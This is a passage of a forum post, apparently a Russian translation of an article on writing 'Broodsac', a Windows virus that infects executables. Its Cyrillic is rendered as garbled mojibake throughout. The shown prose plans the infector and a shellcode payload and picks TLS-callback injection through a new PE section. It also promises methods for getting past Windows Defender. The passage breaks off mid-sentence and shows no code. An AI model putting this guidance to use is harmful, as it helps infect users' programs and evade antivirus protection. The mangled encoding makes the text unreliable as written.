–≠—Ç–æ –Ω–µ –∑–Ω–∞—á–∏—Ç, —á—Ç–æ –Ω–∞—à–∏ –±—ã—Å—Ç—Ä—ã–µ —Ö–∞–∫–∏ –Ω–µ –≤—ã–ø–æ–ª–Ω—è—é—Ç —Å–≤–æ—é —Ü–µ–ª—å ‚Äî –≤—ã–ø–æ–ª–Ω—è—é—Ç. –ù–æ —á–∞—â–µ –≤—Å–µ–≥–æ –æ–Ω–∏ –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω—ã –¥–ª—è —Å–∫–æ—Ä–æ—Å—Ç–∏, –∞ –Ω–µ –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏, –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–æ—Å—Ç–∏ –∏–ª–∏ –ø–µ—Ä–µ–Ω–æ—Å–∏–º–æ—Å—Ç–∏. –•–æ—Ä–æ—à–∞—è —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏, –∏–Ω–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤—É—è –∫—Ä–∞—Ç–∫–æ—Å—Ä–æ—á–Ω–æ–π —Å–∫–æ—Ä–æ—Å—Ç—å—é —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏, –æ–±–µ—Å–ø–µ—á–∏–≤–∞–µ—Ç —ç—Ç–∏ –≤–µ—â–∏.<br />
<br />
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ Unix —É–∂–µ –∑–Ω–∞–∫–æ–º—ã —Å —ç—Ç–∏–º. –û–¥–Ω–∞ –∏–∑ —Å—Ç–∞—Ä–µ–π—à–∏—Ö —Å–∏—Å—Ç–µ–º —Å–±–æ—Ä–∫–∏, GNU Make –∏ –Ω–∞–±–æ—Ä –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ autotools, —è–≤–ª—è–µ—Ç—Å—è –æ—Å–Ω–æ–≤–æ–π –¥–ª—è –æ–±–º–µ–Ω–∞ –∏ —Å–±–æ—Ä–∫–∏ –∫–æ–¥–∞ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞—Ö, –ø–æ—Ö–æ–∂–∏—Ö –Ω–∞ Unix. –û–¥–Ω–∞–∫–æ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π Windows —Ç–∞–∫–æ–π –∫—É–ª—å—Ç—É—Ä—ã –Ω–µ—Ç. –í—Å—ë —ç—Ç–æ ‚Äî –ø—Ä–æ–µ–∫—Ç—ã Visual Studio. –ò, –∫–∞–∫ –≤—Å–µ–≥–¥–∞, —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏ MSVC ‚Äî –Ω–∞—Å—Ç–æ—è—â–∞—è —á—ë—Ä–Ω–∞—è –∫–æ—Ä–æ–±–∫–∞ –∑–∞ IDE Visual Studio. –•–∞–∫–µ—Ä—ã, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç —É–ø—Ä–∞–≤–ª—è—Ç—å —ç—Ç–æ–π —á—ë—Ä–Ω–æ–π –º–∞–≥–∏–µ–π MSVC –ø–æ —Å–≤–æ–µ–º—É —É—Å–º–æ—Ç—Ä–µ–Ω–∏—é, –±–µ–∑—É—Å–ª–æ–≤–Ω–æ, –≤–¥–æ—Ö–Ω–æ–≤–ª—è—é—Ç –Ω–∞—Å —Å–≤–æ–∏–º–∏ –Ω–µ–≤–µ—Ä–æ—è—Ç–Ω—ã–º–∏ payload-–∞–º–∏. –ì–æ—Å–ø–æ–¥—å –∑–Ω–∞–µ—Ç, –∫–∞–∫ –±—ã —è —Ö–æ—Ç–µ–ª —É–≤–∏–¥–µ—Ç—å —Å–∏—Å—Ç–µ–º—É —Å–±–æ—Ä–∫–∏ SmokeLoader[10].<br />
<br />
–í—ã –º–æ–∂–µ—Ç–µ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å —ç—Ç—É —Å—Ç–∞—Ç—å—é –∫–∞–∫ –∫—É–ª–∏–Ω–∞—Ä–Ω—ã–π —Ä–µ—Ü–µ–ø—Ç. –•–æ—Ç—è —Ç–µ—Ö–Ω–∏–∫–∞ –≤–∏—Ä—É—Å–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –∑–¥–µ—Å—å, –¥–∞–ª–µ–∫–æ –Ω–µ –Ω–æ–≤–∞ (&quot;roy g biv —É–∂–µ —ç—Ç–æ —Å–¥–µ–ª–∞–ª&quot;), –æ–Ω–∞ –æ–±—ë—Ä–Ω—É—Ç–∞ –≤ —Ç–µ—Ö–Ω–∏–∫–∏ –∏ –ª—É—á—à–∏–µ –ø—Ä–∞–∫—Ç–∏–∫–∏ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ª—é–±–æ–≥–æ —Ç–∏–ø–∞ –≤–∏—Ä—É—Å–∞. –ú—ã —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–∞–¥—ë–∂–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã —Å–±–æ—Ä–∫–∏ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –Ω–∞—à–µ–≥–æ –≤–∏—Ä—É—Å–∞ –∏ –æ–±—Å—É–¥–∏–º —Ç–µ—Ö–Ω–∏–∫–∏ –¥–ª—è —Å–∏—Å—Ç–µ–º —Å–±–æ—Ä–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ —É—Å–∫–æ—Ä—è—é—Ç –Ω–∞—à—É —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º.<br />
<br />
<b><u>–ú—ã —Ç–∞–∫–∂–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è –æ–±—Ö–æ–¥–∞ Windows Defender</u></b>, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ —Ç–µ–ø–µ—Ä—å –±–∞–∑–æ–≤—ã–π —É—Ä–æ–≤–µ–Ω—å, –ø—Ä–æ—Ç–∏–≤ –∫–æ—Ç–æ—Ä–æ–≥–æ –º—ã –¥–æ–ª–∂–Ω—ã —Ä–∞–∑—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å.<br />
<br />
–ß—Ç–æ–±—ã —Å–ª–µ–¥–æ–≤–∞—Ç—å –º–∞—Ç–µ—Ä–∏–∞–ª—É, –ø–æ–ª—É—á–∏—Ç–µ –∫–æ–ø–∏—é Visual Studio —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π C++, CMake (<a href="https://cmake.org/" target="_blank" class="link link--external" rel="noopener">CMake - Upgrade Your Software Build System</a>) –∏ NASM –¥–ª—è Windows (<a href="https://nasm.us/" target="_blank" class="link link--external" rel="noopener">NASM</a>).<br />
–î–ª—è –ø–æ–ª–Ω–æ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è —ç—Ç–æ–π —Å—Ç–∞—Ç—å–∏ –≤–∞–º –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –±–∞–∑–æ–≤–æ–µ –ø–æ–Ω–∏–º–∞–Ω–∏–µ PE-—Ñ–∞–π–ª–æ–≤.<br />
<br />
<b>--[ 2. –ü–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∏—Ä—É—Å–∞</b><br />
<br />
–ú—ã —Ö–æ—Ç–∏–º —Å–æ–∑–¥–∞—Ç—å –∑–∞—Ä–∞–∂–∞—é—â–∏–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã –≤–∏—Ä—É—Å –¥–ª—è Windows. –î–ª—è —ç—Ç–æ–≥–æ –Ω–∞–º –Ω—É–∂–Ω–æ —Ä–∞–∑–±–∏—Ç—å –Ω–∞ —Å–æ—Å—Ç–∞–≤–ª—è—é—â–∏–µ —á–∞—Å—Ç–∏ –≤—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã, —É—á–∞—Å—Ç–≤—É—é—â–∏–µ –≤ –∑–∞—Ä–∞–∂–µ–Ω–∏–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤. –•–æ—Ç—è —Ç—Ä–∞–¥–∏—Ü–∏–æ–Ω–Ω—ã–µ –≤–∏—Ä—É—Å—ã –¥–ª—è –∑–∞—Ä–∞–∂–µ–Ω–∏—è –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ —É—Å—Ç–∞—Ä–µ–ª–∏ –∏–∑-–∑–∞ —É–ª—É—á—à–µ–Ω–∏–π –≤ –∑–∞—â–∏—Ç–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤, —ç—Ç–æ –≤—Å—ë –µ—â—ë –≤–æ–∑–º–æ–∂–Ω–æ ‚Äî –æ—Å–æ–±–µ–Ω–Ω–æ —Å –ø–æ—è–≤–ª–µ–Ω–∏–µ–º —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –º–æ–≥—É—Ç –ø–æ–∑–≤–æ–ª–∏—Ç—å —Å–µ–±–µ –∏–ª–∏ –Ω–µ –∑–∞–±–æ—Ç—è—Ç—Å—è –æ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–∏ —Å–≤–æ–∏—Ö –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤. (–ü—Ä–∏–≤–µ—Ç, Rust!)<br />
<br />
–ù–∞ –Ω–∞—á–∞–ª—å–Ω–æ–º —ç—Ç–∞–ø–µ —É –Ω–∞—Å –µ—Å—Ç—å –¥–≤–∞ —ç–ª–µ–º–µ–Ω—Ç–∞: <i>–∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å</i> –∏ <i>–∏–Ω—Ñ–µ–∫—Ü–∏—è</i>. –û—á–µ–≤–∏–¥–Ω–æ, —á—Ç–æ <i>–∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å</i> –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ –∑–∞—Ä–∞–∂–µ–Ω–∏–µ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤. <i>–ò–Ω—Ñ–µ–∫—Ü–∏—è</i> ‚Äî —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ –ª—é–±–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞, –∫–æ—Ç–æ—Ä—É—é –º—ã —Ö–æ—Ç–∏–º –≤–Ω–µ–¥—Ä–∏—Ç—å –≤ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã. –£–∂–µ –∑–¥–µ—Å—å —É –Ω–∞—Å –ø–æ—è–≤–ª—è–µ—Ç—Å—è –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å, —Å –∫–æ—Ç–æ—Ä–æ–π –Ω—É–∂–Ω–æ —Ä–∞–±–æ—Ç–∞—Ç—å: –µ—Å—Ç–µ—Å—Ç–≤–µ–Ω–Ω–æ, <i>–∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å</i> –∑–∞–≤–∏—Å–∏—Ç –æ—Ç <i>–∏–Ω—Ñ–µ–∫—Ü–∏–∏</i> –≤ —Å–∏—Å—Ç–µ–º–µ —Å–±–æ—Ä–∫–∏, –∫–∞–∫–∏–º-—Ç–æ –æ–±—Ä–∞–∑–æ–º. –ú—ã —Ö–æ—Ç–∏–º, —á—Ç–æ–±—ã –∏–Ω—Ñ–µ–∫—Ü–∏—è –±—ã–ª–∞ –≥–∏–±–∫–æ–π –∏ –ø–µ—Ä–µ–Ω–æ—Å–∏–º–æ–π, —á—Ç–æ–±—ã –µ—ë –±—ã–ª–æ –∫–∞–∫ –º–æ–∂–Ω–æ –ª–µ–≥—á–µ –≤–Ω–µ–¥—Ä—è—Ç—å –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã. Shell-–∫–æ–¥ –∏–¥–µ–∞–ª—å–Ω–æ –ø–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è —ç—Ç–æ–π —Ü–µ–ª–∏.<br />
<br />
–î–ª—è –Ω–∞–ø–∏—Å–∞–Ω–∏—è –∫–∞—á–µ—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ shell-–∫–æ–¥–∞ –º—ã –ø—Ä–∏–¥–µ—Ä–∂–∏–≤–∞–µ–º—Å—è —Ñ–∏–ª–æ—Å–æ—Ñ–∏–∏ C-then-ASM –¥–ª—è –Ω–∞–ø–∏—Å–∞–Ω–∏—è –Ω–∞—à–µ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –í Broodsac (–≠—Ç–æ –Ω–∞—à –ø—Ä–æ–µ–∫—Ç, –∫–æ—Ç–æ—Ä—ã–π –º—ã –±—É–¥–µ–º –æ–ø–∏—Å—ã–≤–∞—Ç—å –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ) –º—ã —Ä–µ—à–∏–ª–∏ –ø–æ–∑–≤–æ–ª–∏—Ç—å –æ–ø—Ç–∏–º–∏–∑–∞—Ç–æ—Ä—É –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –æ–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å –Ω–∞—à C-–∫–æ–¥ –∏ –ø–µ—Ä–µ–≤–µ–ª–∏ –µ–≥–æ –≤ assembly-—Ñ–∞–π–ª.<br />
<br />
–•–æ—Ç—è —ç—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å —É—Ç–æ–º–∏—Ç–µ–ª—å–Ω–æ, —á–µ–º –±–æ–ª—å—à–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è shell-–∫–æ–¥, –Ω–∞–º, –∫ —Å—á–∞—Å—Ç—å—é, –Ω–µ –Ω—É–∂–Ω–æ –±–µ—Å–ø–æ–∫–æ–∏—Ç—å—Å—è –æ —Ç—Ä–∞–¥–∏—Ü–∏–æ–Ω–Ω—ã—Ö —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è—Ö –∫ shell-–∫–æ–¥—É –ø—Ä–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏, –ø–æ—Å–∫–æ–ª—å–∫—É –º—ã –Ω–∞—Ü–µ–ª–µ–Ω—ã –Ω–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª, –∞ –Ω–µ –Ω–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ–º—ã–π –±—É—Ñ–µ—Ä. –°–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, —É –Ω–∞—Å –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –º–µ–Ω—å—à–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –ø–æ—Å–∫–æ–ª—å–∫—É Windows –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∫–∞–∫ 32-–±–∏—Ç–Ω—ã–µ, —Ç–∞–∫ –∏ 64-–±–∏—Ç–Ω—ã–µ –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã, –∏ –±—É–¥—É—á–∏ –¥–∏–Ω–æ–∑–∞–≤—Ä–æ–º, –∫–∞–∫–∏–º –æ–Ω–∞ —è–≤–ª—è–µ—Ç—Å—è, 32-–±–∏—Ç–Ω–∞—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –≤—Å—ë –µ—â—ë –∞–∫—Ç—É–∞–ª—å–Ω–∞. –ü–æ—ç—Ç–æ–º—É –ø–æ—Ç—Ä–µ–±—É—é—Ç—Å—è –ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ –¥–ª—è –æ–±–µ–∏—Ö –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä.<br />
<br />
–ù–∞ –Ω–∞—á–∞–ª—å–Ω–æ–º —ç—Ç–∞–ø–µ –Ω–∞—à–µ–≥–æ –ø–ª–∞–Ω–∞ –∏–µ—Ä–∞—Ä—Ö–∏—è –≤–∏—Ä—É—Å–∞ –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<ul>
<li data-xf-list-type="ul">broodsac<ul>
<li data-xf-list-type="ul">infection<ul>
<li data-xf-list-type="ul">ASM<ul>
<li data-xf-list-type="ul">32</li>
<li data-xf-list-type="ul">64</li>
</ul></li>
<li data-xf-list-type="ul">C</li>
</ul></li>
</ul></li>
</ul>–ò–Ω—Ñ–µ–∫—Ü–∏—è ‚Äî —ç—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç—å –¥–ª—è –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—è, –∏, –∫–∞–∫ —Ç–∞–∫–æ–≤–∞—è, –æ–Ω–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —Ä–∞–∑–º–µ—â–µ–Ω–∞ –≤ –µ–≥–æ –∫–∞—Ç–∞–ª–æ–≥–µ –∫–∞–∫ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å. –ú—ã –¥–æ–ª–∂–Ω—ã –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç—å —Å–µ–±–µ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å assembly-–ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –æ—Ç–¥–µ–ª—å–Ω—ã–µ –±–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã –¥–ª—è —Ü–µ–ª–µ–π —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –≤ –∞–±—Å—Ç—Ä–∞–∫—Ç–Ω–æ–º –≤–∏–¥–µ —É –Ω–∞—Å –µ—Å—Ç—å –ø—Ä–∏–º–µ—Ä–Ω–æ —á–µ—Ç—ã—Ä–µ –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–∞ –¥–ª—è —Ä–∞–±–æ—Ç—ã ‚Äî –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å, 32-–±–∏—Ç–Ω—ã–π ASM, 64-–±–∏—Ç–Ω—ã–π ASM –∏ C payload. –ù–∞—à –∑–∞—Ä–∞–∂–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –ø–æ–ª–∞–≥–∞—Ç—å—Å—è —Ç–æ–ª—å–∫–æ –Ω–∞ assembly-–ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏, –ø–æ—ç—Ç–æ–º—É –º—ã –¥–æ–ª–∂–Ω—ã –∫–∞–∫-—Ç–æ —Å–æ–µ–¥–∏–Ω–∏—Ç—å —ç—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç—ã —Å –Ω–∞—à–∏–º –∑–∞—Ä–∞–∂–∞—Ç–µ–ª–µ–º –Ω–∞ —ç—Ç–∞–ø–µ —Å–±–æ—Ä–∫–∏.<br />
<br />
–ò–º–µ—è –ø—Ä–æ–µ–∫—Ç—ã, —Ä–∞–∑–¥–µ–ª—ë–Ω–Ω—ã–µ —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –ø—Ä–æ—â–µ —É–ø—Ä–∞–≤–ª—è—Ç—å.<br />
<br />
–°–æ–∑–¥–∞–Ω–∏–µ —Å–∏—Å—Ç–µ–º—ã —Å–±–æ—Ä–∫–∏ –¥–ª—è –≤–∞—à–µ–≥–æ –≤–∏—Ä—É—Å–∞ –≤—ã—è–≤–ª—è–µ—Ç –±–æ–ª–µ–≤—ã–µ —Ç–æ—á–∫–∏ –≤ —Å–ª—É—á–∞—è—Ö, –∫–æ–≥–¥–∞ —á—Ç–æ-—Ç–æ –∏–¥—ë—Ç –Ω–µ —Ç–∞–∫, –ø–æ–∑–≤–æ–ª—è—è –≤–∞–º –±—ã—Å—Ç—Ä–æ –∏ —ç–ª–µ–≥–∞–Ω—Ç–Ω–æ —Ä–µ—à–∏—Ç—å –ø—Ä–æ–±–ª–µ–º—É. –û–Ω–∞ —Ç–∞–∫–∂–µ –¥–µ–π—Å—Ç–≤—É–µ—Ç –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ–µ, –∏–Ω–∂–µ–Ω–µ—Ä–Ω–æ–µ —Å—Ä–µ–¥—Å—Ç–≤–æ, –∫–æ—Ç–æ—Ä–æ–µ —Å–≤—è–∑—ã–≤–∞–µ—Ç –≤–∞—à—É —Å–±–æ—Ä–∫—É. –ß–µ–º —Å–ª–æ–∂–Ω–µ–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –≤–∞—à –≤–∏—Ä—É—Å, —Ç–µ–º –±–æ–ª–µ–µ –≤–∞–∂–Ω–æ–π —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –Ω–∞–¥—ë–∂–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ —Å–±–æ—Ä–∫–∏.<br />
<br />
<b>--[ 3. –ü—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∏—Ä—É—Å–∞</b><br />
<br />
–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å –∞–±—Å—Ç—Ä–∞–∫—Ç–Ω—ã–π –¥–∏–∑–∞–π–Ω –≤—Å–µ—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –Ω–∞—à–µ–≥–æ –≤–∏—Ä—É—Å–∞. –î–∞–ª–µ–µ –Ω–∞–º –Ω—É–∂–Ω–æ –∑–∞–ø–æ–ª–Ω–∏—Ç—å –ø—Ä–æ–±–µ–ª—ã! –£ –Ω–∞—Å –µ—Å—Ç—å –¥–≤–∞ –≤–æ–ø—Ä–æ—Å–∞, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ –æ—Ç–≤–µ—Ç–∏—Ç—å:<br />
<br />
<ul>
<li data-xf-list-type="ul">–ö–∞–∫ –Ω–∞—à –≤–∏—Ä—É—Å –¥–æ–ª–∂–µ–Ω –∑–∞—Ä–∞–∂–∞—Ç—å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª?</li>
<li data-xf-list-type="ul">–ß—Ç–æ –¥–æ–ª–∂–Ω–∞ –¥–µ–ª–∞—Ç—å –Ω–∞—à–∞ –≤–∏—Ä—É—Å–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞?</li>
</ul><br />
–ü–µ—Ä–≤—ã–π –≤–æ–ø—Ä–æ—Å –±—ã–ª —Ä–µ—à—ë–Ω —Å–Ω–∞—á–∞–ª–∞ –Ω–∞–∏–≤–Ω–æ ‚Äî —Å –ø–æ–º–æ—â—å—é —Å–∫—Ä—ã—Ç—ã—Ö –∫–æ–¥–æ–≤ –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ PE-—Ñ–∞–π–ª–∞. –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ ‚Äî —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, —Å—Ç–∞—Ä–∞—è –∫–∞–∫ –∏–Ω—Ñ–µ–∫—Ü–∏–∏ EXE-—Ñ–∞–π–ª–æ–≤[1]. –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —Å–∫—Ä—ã—Ç—ã–µ –∫–æ–¥—ã –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–∞—Ö —Ä–µ–¥–∫–æ –∏–º–µ—é—Ç —Ä–∞–∑–º–µ—Ä, –¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –≥–∏–≥–∞–Ω—Ç—Å–∫–∏–º shell-–∫–æ–¥–æ–º –¥–ª—è Windows. –í —Å—Ä–µ–¥–Ω–µ–º, —ç—Ç–æ –æ–∫–æ–ª–æ 200 –±–∞–π—Ç. –ü–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è Linux shell-–∫–æ–¥–∞, –Ω–æ –Ω–µ –¥–ª—è Windows.<br />
<br />
–ü–æ—Å–ª–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Ä–∞–∑–¥—É–º–∏–π –±—ã–ª–æ —Ä–µ—à–µ–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ –≤ –∫–∞—Ç–∞–ª–æ–≥ TLS[2]. –ö–∞—Ç–∞–ª–æ–≥ TLS (Thread Local Storage) ‚Äî —ç—Ç–æ –æ–¥–∏–Ω –∏–∑ –º–Ω–æ–≥–∏—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤ –≤ PE-—Ñ–∞–π–ª–µ. –û–Ω –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ç–∞–∫—Ç–∏–∫–∞–º–∏ —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ –ø–æ—Ç–æ–∫–æ–≤ –≤ –¥–∞–Ω–Ω–æ–º –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º —Ñ–∞–π–ª–µ. –ü—Ä–∏–º–µ—á–∞—Ç–µ–ª—å–Ω–æ–π —á–µ—Ä—Ç–æ–π –∫–∞—Ç–∞–ª–æ–≥–∞ TLS —è–≤–ª—è—é—Ç—Å—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–æ–Ω–Ω—ã–µ –æ–±—Ä–∞—Ç–Ω—ã–µ –≤—ã–∑–æ–≤—ã. –ò—Ö –º–æ–∂–µ—Ç –±—ã—Ç—å –º–Ω–æ–≥–æ, –∏ –æ–Ω–∏ –≤—ã–∑—ã–≤–∞—é—Ç—Å—è –ø–æ–æ—á–µ—Ä—ë–¥–Ω–æ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–∞. –î—Ä—É–≥–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, –∫–∞—Ç–∞–ª–æ–≥ TLS –∏–º–µ–µ—Ç –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç –ø–µ—Ä–µ–¥ –æ—Å–Ω–æ–≤–Ω–æ–π —Ä—É—Ç–∏–Ω–æ–π, —Ç–∞–∫ –∫–∞–∫ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞—Ç–∞–ª–æ–≥–∞ TLS —è–≤–ª—è–µ—Ç—Å—è —á–∞—Å—Ç—å—é –ø—Ä–æ—Ü–µ—Å—Å–∞ –∑–∞–≥—Ä—É–∑–∫–∏ PE-—Ñ–∞–π–ª–∞. –ó–∞–ø–æ–º–Ω–∏—Ç–µ —ç—Ç–æ—Ç –ø–æ—Å–ª–µ–¥–Ω–∏–π –º–æ–º–µ–Ω—Ç ‚Äî –æ–Ω —Å—ã–≥—Ä–∞–µ—Ç —Å –Ω–∞–º–∏ –∑–ª—É—é —à—É—Ç–∫—É –ø–æ–∑–∂–µ.<br />
<br />
–í–æ–ø—Ä–æ—Å –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, –∫–∞–∫ –Ω–∞—à —Ä–∞–∑–¥–µ–ª TLS –±—É–¥–µ—Ç –≤—Å—Ç–∞–≤–ª–µ–Ω –≤ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª. –ú—ã –ø—Ä–æ—Å—Ç–æ –≤—ã–±—Ä–∞–ª–∏ –≤—Å—Ç–∞–≤–∫—É –Ω–æ–≤–æ–≥–æ —Ä–∞–∑–¥–µ–ª–∞, —Ç–∞–∫ –∫–∞–∫ –º–æ–∂–µ–º –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å, —á—Ç–æ —Ä–∞–∑–¥–µ–ª –±—É–¥–µ—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º –∏ –∑–∞–ø–∏—Å—ã–≤–∞–µ–º—ã–º, –≤ –æ—Ç–ª–∏—á–∏–µ 